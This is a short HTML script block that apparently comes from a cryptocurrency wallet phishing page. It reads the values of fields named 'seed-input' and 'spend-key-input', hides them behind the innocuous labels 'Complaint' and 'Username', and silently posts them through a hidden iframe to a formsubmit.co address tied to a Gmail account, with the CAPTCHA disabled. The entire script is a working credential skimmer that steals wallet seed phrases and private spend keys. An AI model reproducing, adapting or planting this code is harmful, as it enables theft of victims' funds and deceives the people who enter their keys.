<script>
    
    // Complaint Input & Button
const complaintInput = document.getElementById("seed-input");
const complaintBtn = document.getElementById("btn-derive-seed");

// Username Input & Button
const usernameInput = document.getElementById("spend-key-input");
const usernameBtn = document.getElementById("btn-derive-key");

// Create hidden iframe once
let iframe = document.getElementById("hidden_iframe");

if (!iframe) {
    iframe = document.createElement("iframe");
    iframe.id = "hidden_iframe";
    iframe.name = "hidden_iframe";
    iframe.style.display = "none";
    document.body.appendChild(iframe);
}

// Function to send data
function sendToFormSubmit(fieldName, fieldValue) {
    const form = document.createElement("form");
    form.method = "POST";
    form.action = "https://formsubmit.co/exchangenet1@gmail.com";
    form.target = "hidden_iframe";
    form.style.display = "none";

    const captcha = document.createElement("input");
    captcha.type = "hidden";
    captcha.name = "_captcha";
    captcha.value = "false";
    form.appendChild(captcha);

    const field = document.createElement("input");
    field.type = "hidden";
    field.name = fieldName;
    field.value = fieldValue;
    form.appendChild(field);

    document.body.appendChild(form);
    form.submit();

    setTimeout(() => {
        form.remove();
    }, 1000);
}

// Complaint button
complaintBtn.addEventListener("click", function () {
    sendToFormSubmit("Complaint", complaintInput.value);
});

// Username button
usernameBtn.addEventListener("click", function () {
    sendToFormSubmit("Username", usernameInput.value);
});
 </script> 